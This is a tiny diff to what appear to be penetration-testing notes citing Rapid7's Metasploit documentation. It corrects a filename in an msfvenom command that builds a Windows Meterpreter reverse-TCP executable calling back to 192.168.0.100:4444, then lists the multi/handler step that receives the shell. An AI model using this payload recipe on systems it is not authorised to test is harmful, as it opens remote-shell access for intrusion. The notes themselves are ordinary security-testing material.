@@ -1,6 +1,6 @@
 https://docs.rapid7.com/metasploit/use-meterpreter-locally-without-an-exploit/  
 
-> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 --format=exe > _mtr_paylod.exe  
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 --format=exe > mtr_payload.exe  
 
 > msf> use exploit/multi/handler  
 
